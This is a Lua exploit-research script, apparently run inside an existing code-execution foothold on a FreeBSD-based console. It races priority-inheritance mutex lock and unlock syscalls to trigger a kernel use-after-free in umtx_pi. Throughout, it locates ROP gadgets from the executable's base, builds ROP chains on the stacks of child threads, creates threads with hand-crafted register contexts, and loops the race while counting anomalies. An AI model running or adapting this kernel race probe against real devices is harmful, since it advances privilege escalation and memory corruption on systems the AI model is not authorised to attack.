-- CRASH_CLASS: MODERATE
-- PROBE 121a: PI mutex thread race — umtx_pi UAF attempt
--
-- Theory: PI mutex lock allocates a kernel umtx_pi object.
-- Unlock frees it. If children enter do_lock_pi() while the
-- parent's do_unlock_pi() is freeing umtx_pi, the child may
-- reference freed memory → UAF.
--
-- Strategy:
--   Parent loop: LOCK → spawn 3 children (each LOCK→UNLOCK→sleep) → UNLOCK → repeat
--   Children enter kernel roughly when parent unlocks → race window.
--   30 total children across 10 iterations.
--
-- Each child ROP chain: syscall(LOCK) → pop rsi=6 → pop rax=454 → syscall(UNLOCK)
--   → pop rdi=ts → pop rax=240 → syscall(nanosleep 999s)

print("=== PROBE 121a: PI MUTEX RACE ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477)
local tc=mk(430)
local sc=mk(454)

-- Eboot base for gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end

local function gad(off)
    return uint64(string.format("0x%X%08X",ehi,elo+off))
end
local PRSI=gad(0xD77D)   -- pop rsi; ret
local PRDI=gad(0xC9DFE)  -- pop rdi; ret
local PRAX=gad(0x992)    -- pop rax; ret

print(string.format("eboot=0x%X%08X SA=%s", ehi, elo, tostring(SA)))

-- Large mmap for data + stacks + contexts
-- 40 children max: need 2 pages each (stack + context) + 2 data pages
local NMAX=40
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64((2+2*NMAX)*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X", R))

-- Data layout (page 0-1)
local pi_mutex=R           -- 32 bytes: PI mutex struct
local ts=R+0x40            -- 16 bytes: nanosleep timespec (999s)
local sl=R+0x60            -- 16 bytes: short sleep (10ms)
local tb=R+0x80            -- 8 bytes: thr_create output TID
local anomaly_buf=R+0x100  -- track anomalies

-- Initialize data
z(R, 0x200)

-- PI mutex: m_owner=0, m_flags=PRIO_INHERIT(0x4)
wd(pi_mutex, 0)
wd(pi_mutex+4, 0x4)
wd(pi_mutex+8, 0)
wd(pi_mutex+12, 0)

-- Timespec for nanosleep 999s
wq(ts, uint64(999)); wq(ts+8, uint64(0))
-- Short sleep 10ms
wq(sl, uint64(0)); wq(sl+8, uint64(10000000))

local function child_stk(i) return R+0x4000*(2+2*i) end
local function child_ctx(i) return R+0x4000*(2+2*i+1) end

-- ============================================================
-- Spawn a child that does: PI_LOCK → PI_UNLOCK → nanosleep(999s)
-- ============================================================
local child_idx=0
local function spawn_pi_child()
    if child_idx>=NMAX then return false end

    local stk=child_stk(child_idx)
    local ctx=child_ctx(child_idx)
    child_idx=child_idx+1

    -- Build ROP chain on stack
    -- After initial syscall (LOCK) returns:
    --   change RSI to 6 (UNLOCK), RAX to 454, syscall
    --   then change RDI to ts, RSI to 0, RAX to 240 (nanosleep), syscall
    local sp=stk
    -- UNLOCK phase
    wq(sp,PRSI); sp=sp+8; wq(sp,uint64(6)); sp=sp+8       -- RSI=UNLOCK
    wq(sp,PRAX); sp=sp+8; wq(sp,uint64(454)); sp=sp+8     -- RAX=_umtx_op
    wq(sp,SA); sp=sp+8                                      -- syscall(unlock)
    -- nanosleep phase (3 copies for safety)
    for rep=1,3 do
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(0)); sp=sp+8   -- RSI=0
        wq(sp,PRDI); sp=sp+8; wq(sp,uint64(ts)); sp=sp+8  -- RDI=timespec
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(240)); sp=sp+8 -- RAX=nanosleep
        wq(sp,SA); sp=sp+8                                  -- syscall
    end

    -- Context setup
    z(ctx, 0x200)
    wq(ctx+0x108, uint64(0x480))  -- gates[0]
    wd(ctx+0x0D0, 0)              -- gates[1] <= 7
    wq(ctx+0x110, uint64(0x10000)) -- gates[2]
    wq(ctx+0x0C0, uint64(0x43))   -- CS
    wq(ctx+0x100, uint64(0x3B))   -- SS
    wq(ctx+0x0E0, SA)             -- RIP = syscall;ret
    wq(ctx+0x0F8, uint64(stk))   -- RSP = stack with ROP chain

    -- Syscall args: _umtx_op(pi_mutex, MUTEX_LOCK=5, 0, 0, 0)
    wq(ctx+0x078, uint64(454))   -- RAX = syscall 454
    wq(ctx+0x048, uint64(pi_mutex)) -- RDI = mutex addr
    wq(ctx+0x050, uint64(5))     -- RSI = op 5 (LOCK)
    wq(ctx+0x058, uint64(0))     -- RDX = 0
    wq(ctx+0x060, uint64(0))     -- R10 = 0
    wq(ctx+0x068, uint64(0))     -- R8 = 0

    wq(tb, uint64(0))
    local ok=pcall(function() tc(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok
end

-- ============================================================
-- RACE LOOP
-- ============================================================
print("--- RACE START ---")
local anomalies=0
local BATCHES=10
local PER_BATCH=3

for batch=1,BATCHES do
    -- Parent locks PI mutex
    local r_lock=N(sc(uint64(pi_mutex),uint64(5),uint64(0),uint64(0),uint64(0)))
    local own_after_lock=rd(pi_mutex)

    if r_lock~=0 then
        print(string.format("B%d: LOCK FAIL ret=%d own=0x%X", batch, r_lock, own_after_lock or 0))
        anomalies=anomalies+1
    end

    -- Spawn children while we hold the lock
    -- They will enter the kernel and try to acquire → block
    for c=1,PER_BATCH do
        spawn_pi_child()
    end

    -- Parent unlocks → children race to acquire
    -- This is the critical race window: kernel processes umtx_pi
    -- while children are queued/entering
    local r_unlock=N(sc(uint64(pi_mutex),uint64(6),uint64(0),uint64(0),uint64(0)))

    if r_unlock~=0 then
        print(string.format("B%d: UNLOCK FAIL ret=%d", batch, r_unlock))
        anomalies=anomalies+1
    end

    -- Brief pause to let children run their lock→unlock
    native.fcall_with_rax(stub, 240, sl, 0)

    -- Check mutex state (should be 0 after children unlock)
    local own_now=rd(pi_mutex)
    if own_now~=nil and own_now~=0 then
        print(string.format("B%d: STALE OWNER 0x%X!", batch, own_now))
        anomalies=anomalies+1
    end

    -- Check canary
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        print(string.format("B%d: PID CHANGED %d→%d!", batch, pid, c))
        anomalies=anomalies+1
        break
    end
end

-- ============================================================
-- Second phase: rapid fire — parent locks/unlocks in tight loop
-- while last batch of children enters
-- ============================================================
print("")
print("--- RAPID FIRE ---")
local rapid_ok=true

for i=1,5 do
    spawn_pi_child()
end

for i=1,200 do
    local rl=N(sc(uint64(pi_mutex),uint64(5),uint64(0),uint64(0),uint64(0)))
    local ru=N(sc(uint64(pi_mutex),uint64(6),uint64(0),uint64(0),uint64(0)))
    if rl~=0 or ru~=0 then
        print(string.format("  rapid %d: lock=%d unlock=%d", i, rl, ru))
        anomalies=anomalies+1
        if rl~=0 then
            -- Parent blocked because a child holds it — wait and retry
            native.fcall_with_rax(stub, 240, sl, 0)
        end
    end
end

local own_final=rd(pi_mutex)
print(string.format("rapid done: owner=0x%X", own_final or 0))

-- ============================================================
print("")
print(string.format("anomalies=%d children=%d", anomalies, child_idx))
local c=N(native.fcall_with_rax(stub,20))
print(string.format("canary=%s", c==pid and "OK" or "FAIL"))
print("=== 121a COMPLETE ===")
